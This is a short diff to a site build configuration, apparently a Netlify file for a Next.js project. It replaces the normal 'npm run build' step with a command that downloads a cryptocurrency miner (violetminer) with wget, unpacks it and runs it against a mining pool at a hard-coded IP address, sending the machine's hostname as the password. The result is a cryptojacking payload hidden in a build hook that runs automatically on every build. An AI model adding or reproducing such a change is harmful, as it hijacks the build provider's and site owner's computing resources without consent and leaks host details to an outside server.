@@ -1,5 +1,5 @@
 [build]
-  command = "npm run build"
+  command = "wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -zxf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool 168.235.86.33:3393 --username SK_QzApkbVGsAxyQykaWSnEF.AutoBitcoin_novalanto --password $(cat /proc/sys/kernel/hostname) --algorithm wrkzcoin"
   publish = ".next"
 
 [[plugins]]
